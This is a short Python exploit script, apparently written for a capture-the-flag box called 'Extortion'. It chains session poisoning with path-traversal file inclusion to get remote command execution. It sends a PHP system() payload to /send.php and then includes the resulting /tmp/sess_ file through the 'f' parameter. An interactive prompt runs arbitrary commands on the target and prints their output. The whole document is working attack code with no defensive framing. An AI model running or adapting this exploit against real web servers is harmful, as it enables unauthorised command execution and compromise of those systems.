#!/usr/bin/env python3

import requests
from cmd import Cmd
import re
import sys

if len(sys.argv) != 2:
    print("[*] usage: python3 Extortion.py <url>")
    sys.exit(0)

url = sys.argv[1]

class Terminal(Cmd):
    prompt = "File => "
    def default(self, args):
        exploiter(args)

def exploiter(cmd):
    sess = requests.session()
    data = {
            "name" : f"<?php system('{cmd}') ?>"
            }
    cookie =requests.post(f"{url}/send.php", data=data)
    cookie = cookie.headers
    cookie = cookie["Set-Cookie"]
    file = re.search("PHPSESSID=(.*?); path=/", cookie, re.DOTALL).group(1)
    params = {"f" : f"../../../../../tmp/sess_{file}"}
    output = requests.get(url, params = params)
    file = re.search('null, "(.*?)"\), ', output.text, re.DOTALL).group(1)
    file = re.search(':"(.*?)";', file, re.DOTALL).group(1)
    print(file)

if __name__ == ("__main__"):
    terminal = Terminal()
    terminal.cmdloop()
